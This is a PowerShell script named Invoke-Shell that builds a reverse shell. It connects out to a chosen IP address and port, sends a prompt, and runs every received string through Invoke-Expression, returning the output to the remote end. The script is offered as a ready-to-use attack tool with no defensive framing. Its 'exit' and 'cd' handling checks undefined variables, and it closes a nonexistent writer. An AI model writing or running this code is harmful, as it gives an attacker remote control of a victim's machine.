<#
.SYNOPSIS
    Invoke-Shell is a PowerShell script that will create a reverse shell to a specified IP address and port.
.DESCRIPTION
    Invoke-Shell is a PowerShell script that will create a reverse shell to a specified IP address and port.
.PARAMETER IPAddress
    The IP address to connect to.
.PARAMETER Port
    The port to connect to.
#>

#------[Declarations]------#
[CmdletBinding()]
param (
    [Parameter(Mandatory = $false)]
    [String]$IPAddress,
    [Parameter(Mandatory = $false)]
    [Int]$Port
)

#------[Functions]------#
function Invoke-Shell {
    param (
        [Parameter(Mandatory = $false)]
        [String]$IPAddress,
        [Parameter(Mandatory = $false)]
        [Int]$Port
    )

    # check if ip address and port are specified else display usage
    if ($IPAddress -eq $null -or $Port -eq $null) {
        Write-Host 'Usage: Invoke-Shell -IPAddress <ip address> -Port <port>'
        exit
    }

    # create a TCP client
    $tcpClient = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)

    # create a stream
    $stream = $tcpClient.GetStream()

    # create a stream writer
    $streamWriter = New-Object System.IO.StreamWriter($stream)

    # create a buffer to read data
    $buffer = New-Object System.Byte[] 1024

    do {
        $streamWriter.Write('PS ' + (Get-Location).Path + '> ')
        $streamWriter.Flush()

        # read the stream
        $read = $null
        while ($stream.DataAvailable -or $null -eq ($read = $stream.Read($buffer, 0, $buffer.Length))) {}
        $out = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $read).Replace("`r`n", "").Replace("`n", "")
        
        switch ($command) {
            "exit" { 
                exit
              }
            "cd" {
                if ($arguments) {
                    Set-Location $($arguments)
                }
                break
              }
            Default {
                $psOutput = try {
                    $res = Invoke-Expression -Command $out
                    $res | Out-String
                } catch {
                    $_.Exception.Message
                }
                $streamWriter.WriteLine($psOutput)
                break
              }
        }
        $streamWriter.Flush()
    } while ($tcpClient.Connected -and $stream.CanRead)

    $writer.Close()
    $stream.Close()
    $tcpClient.Close()
}

#------[Execution]------#
if ($IPAddress -and $Port) {
    Invoke-Shell -IPAddress $IPAddress -Port $Port
}